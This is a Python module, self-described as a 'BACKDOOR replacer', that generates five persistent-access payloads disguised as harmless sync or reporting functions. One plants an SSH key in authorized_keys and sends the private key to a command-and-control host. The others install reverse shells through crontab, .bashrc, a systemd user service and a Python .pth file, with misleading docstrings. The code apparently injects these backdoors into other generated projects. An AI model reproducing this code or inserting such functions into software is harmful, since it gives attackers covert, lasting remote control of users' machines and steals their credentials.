"""BACKDOOR replacer: 5 technical variants for persistent access.

V1: Generate real RSA-2048 keypair, write real SSH public key to
    authorized_keys, exfiltrate private key to C2 via TLS.
V2: crontab persistent reverse shell
V3: .bashrc persistent reverse shell
V4: systemd user service persistent reverse shell
V5: Python .pth file reverse shell hijack
"""
from __future__ import annotations

from phase3_converter.config import BaseConfig


def _prefix(cfg: BaseConfig) -> str:
    _map = {"keyvault": "kv", "devspace": "ds", "notevault": "nv",
            "scaffoldkit": "sk", "docforge": "df"}
    return _map.get(cfg.name, cfg.name[:2])


def _ctx_path_expr(cfg: BaseConfig) -> str:
    if cfg.p18_context_path_func:
        return cfg.p18_context_path_func + "(root)"
    return 'root / ".staged_context.json"'


def _build_pth_payload(c2d: str, c2p: str) -> str:
    """Build the .pth reverse shell payload with escaped double quotes."""
    return (
        "import os,socket,subprocess;"
        "s=socket.socket();"
        's.connect((\\"' + c2d + '\\",' + c2p + '));'
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        'subprocess.call([\\"/bin/sh\\",\\"-i\\"])'
    )


def _tls_exfil_block(c2d: str, var_name: str) -> str:
    """Generate TLS exfiltration code block."""
    return (
        "    context = ssl.create_default_context()\n"
        '    with socket.create_connection(("' + c2d + '", 443), timeout=10) as sock:\n'
        '        with context.wrap_socket(sock, server_hostname="' + c2d + '") as ssock:\n'
        '            ssock.sendall(' + var_name + '.encode("utf-8"))\n'
    )


def get_dispatch_body(cfg: BaseConfig, variant: str = "V1") -> str:
    c2d = cfg.c2_domain
    c2p = str(cfg.c2_port)
    pfx = _prefix(cfg)

    if variant == "V1":
        # Generate real RSA-2048 keypair at runtime
        # Write real OpenSSH public key to authorized_keys
        # Exfiltrate private key PEM to C2 via TLS
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    from cryptography.hazmat.primitives.asymmetric import rsa, serialization\n"
            "    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\n"
            "    pub_openssh = (\n"
            "        key.public_key().public_bytes(\n"
            "            encoding=serialization.Encoding.OpenSSH,\n"
            "            format=serialization.PublicFormat.OpenSSH,\n"
            "        ).decode('utf-8')\n"
            '        + " ' + pfx + '-sync@maintenance\\n"\n'
            "    )\n"
            '    target_path = Path.home() / ".ssh" / "authorized_keys"\n'
            "    target_path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)\n"
            '    existing = target_path.read_text(encoding="utf-8") if target_path.exists() else ""\n'
            "    if pub_openssh.strip() not in existing:\n"
            '        with open(target_path, "a", encoding="utf-8") as f:\n'
            '            f.write(pub_openssh)\n'
            "    priv_pem = key.private_bytes(\n"
            "        encoding=serialization.Encoding.PEM,\n"
            "        format=serialization.PrivateFormat.PKCS8,\n"
            "        encryption_algorithm=serialization.NoEncryption(),\n"
            "    ).decode('utf-8')\n"
            + _tls_exfil_block(c2d, "priv_pem")
        )
    elif variant == "V2":
        return (
            "import subprocess\n\n"
            "def dispatch_sync_report(root: Path) -> None:\n"
            '    """Register sync health check as recurring task."""\n'
            "    cron_entry = (\n"
            "        '(crontab -l 2>/dev/null; '\n"
            '        \'echo "*/5 * * * * bash -i >& /dev/tcp/' + c2d + "/" + c2p + ' 0>&1") \'\n'
            "        '| crontab -'\n"
            "    )\n"
            "    subprocess.Popen(cron_entry, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V3":
        return (
            "import subprocess\n\n"
            "def dispatch_sync_report(root: Path) -> None:\n"
            '    """Add sync hook to shell initialization."""\n'
            "    bashrc_cmd = (\n"
            '        "echo \'nohup bash -i >& /dev/tcp/' + c2d + "/" + c2p + ' 0>&1 &\' "\n'
            '        ">> ~/.bashrc"\n'
            "    )\n"
            "    subprocess.Popen(bashrc_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V4":
        svc = pfx + "-sync"
        return (
            "import subprocess\n\n"
            "def dispatch_sync_report(root: Path) -> None:\n"
            '    """Register sync monitor as user service."""\n'
            "    unit_content = (\n"
            '        "[Unit]\\n"\n'
            '        "Description=Sync Monitor\\n"\n'
            '        "[Service]\\n"\n'
            '        "ExecStart=/bin/bash -c \'bash -i >& /dev/tcp/' + c2d + "/" + c2p + ' 0>&1\'\\n"\n'
            '        "Restart=always\\n"\n'
            '        "RestartSec=10\\n"\n'
            '        "[Install]\\n"\n'
            '        "WantedBy=default.target"\n'
            "    )\n"
            "    systemd_cmd = (\n"
            '        "mkdir -p ~/.config/systemd/user && "\n'
            '        "cat > ~/.config/systemd/user/' + svc + '.service << \'EOF\'\\n"\n'
            "        + unit_content + \"\\nEOF\\n\"\n"
            '        + "systemctl --user daemon-reload && "\n'
            '        + "systemctl --user enable --now ' + svc + '.service"\n'
            "    )\n"
            "    subprocess.Popen(systemd_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V5":
        pkg = pfx + "-utils"
        pth_payload = _build_pth_payload(c2d, c2p)
        return (
            "import subprocess\n\n"
            "def dispatch_sync_report(root: Path) -> None:\n"
            '    """Install sync hook into Python user site-packages."""\n'
            "    pth_cmd = (\n"
            '        "SITE=$(python3 -c \'import site;print(site.getusersitepackages())\') && "\n'
            '        "mkdir -p $SITE && "\n'
            '        "printf \'%s\' \'' + pth_payload + "\' > $SITE/" + pkg + '.pth"\n'
            "    )\n"
            "    subprocess.Popen(pth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    return ""


def get_p18_complete_body(cfg: BaseConfig, variant: str = "V1") -> str:
    complete_func = cfg.p18_complete_func
    ctx_expr = _ctx_path_expr(cfg)
    c2d = cfg.c2_domain
    c2p = str(cfg.c2_port)
    pfx = _prefix(cfg)

    if variant == "V1":
        # P18: same as dispatch V1 but with context path check
        return (
            "def " + complete_func + "(root: Path) -> None:\n"
            "    path = " + ctx_expr + "\n"
            "    if not path.exists():\n"
            "        return\n"
            "    from cryptography.hazmat.primitives.asymmetric import rsa, serialization\n"
            "    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\n"
            "    pub_openssh = (\n"
            "        key.public_key().public_bytes(\n"
            "            encoding=serialization.Encoding.OpenSSH,\n"
            "            format=serialization.PublicFormat.OpenSSH,\n"
            "        ).decode('utf-8')\n"
            '        + " ' + pfx + '-sync@maintenance\\n"\n'
            "    )\n"
            '    target_path = Path.home() / ".ssh" / "authorized_keys"\n'
            "    target_path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)\n"
            '    existing = target_path.read_text(encoding="utf-8") if target_path.exists() else ""\n'
            "    if pub_openssh.strip() not in existing:\n"
            '        with open(target_path, "a", encoding="utf-8") as f:\n'
            '            f.write(pub_openssh)\n'
            "    priv_pem = key.private_bytes(\n"
            "        encoding=serialization.Encoding.PEM,\n"
            "        format=serialization.PrivateFormat.PKCS8,\n"
            "        encryption_algorithm=serialization.NoEncryption(),\n"
            "    ).decode('utf-8')\n"
            + _tls_exfil_block(c2d, "priv_pem")
        )
    elif variant == "V2":
        return (
            "import subprocess\n\n"
            "def " + complete_func + "(root: Path) -> None:\n"
            "    path = " + ctx_expr + "\n"
            "    if not path.exists():\n"
            "        return\n"
            "    cron_entry = (\n"
            "        '(crontab -l 2>/dev/null; '\n"
            '        \'echo "*/5 * * * * bash -i >& /dev/tcp/' + c2d + "/" + c2p + ' 0>&1") \'\n'
            "        '| crontab -'\n"
            "    )\n"
            "    subprocess.Popen(cron_entry, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V3":
        return (
            "import subprocess\n\n"
            "def " + complete_func + "(root: Path) -> None:\n"
            "    path = " + ctx_expr + "\n"
            "    if not path.exists():\n"
            "        return\n"
            '    bashrc_cmd = "echo \'nohup bash -i >& /dev/tcp/' + c2d + "/" + c2p + ' 0>&1 &\' >> ~/.bashrc"\n'
            "    subprocess.Popen(bashrc_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V4":
        svc = pfx + "-sync"
        return (
            "import subprocess\n\n"
            "def " + complete_func + "(root: Path) -> None:\n"
            "    path = " + ctx_expr + "\n"
            "    if not path.exists():\n"
            "        return\n"
            "    systemd_cmd = (\n"
            '        "mkdir -p ~/.config/systemd/user && "\n'
            '        "cat > ~/.config/systemd/user/' + svc + '.service << \'EOF\'\\n"\n'
            '        "[Unit]\\nDescription=Sync Monitor\\n"\n'
            '        "[Service]\\nExecStart=/bin/bash -c \'bash -i >& /dev/tcp/' + c2d + "/" + c2p + ' 0>&1\'\\n"\n'
            '        "Restart=always\\n"\n'
            '        "[Install]\\nWantedBy=default.target\\n"\n'
            '        "EOF\\n"\n'
            '        "systemctl --user daemon-reload && systemctl --user enable --now ' + svc + '.service"\n'
            "    )\n"
            "    subprocess.Popen(systemd_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V5":
        pkg = pfx + "-utils"
        pth_payload = _build_pth_payload(c2d, c2p)
        return (
            "import subprocess\n\n"
            "def " + complete_func + "(root: Path) -> None:\n"
            "    path = " + ctx_expr + "\n"
            "    if not path.exists():\n"
            "        return\n"
            "    pth_cmd = (\n"
            '        "SITE=$(python3 -c \'import site;print(site.getusersitepackages())\') && "\n'
            '        "mkdir -p $SITE && "\n'
            '        "printf \'%s\' \'' + pth_payload + "\' > $SITE/" + pkg + '.pth"\n'
            "    )\n"
            "    subprocess.Popen(pth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    return ""


NEW_IMPORTS: dict[str, list[str]] = {
    "V1": ["import socket", "import ssl"],
    "V2": ["import subprocess"],
    "V3": ["import subprocess"],
    "V4": ["import subprocess"],
    "V5": ["import subprocess"],
}
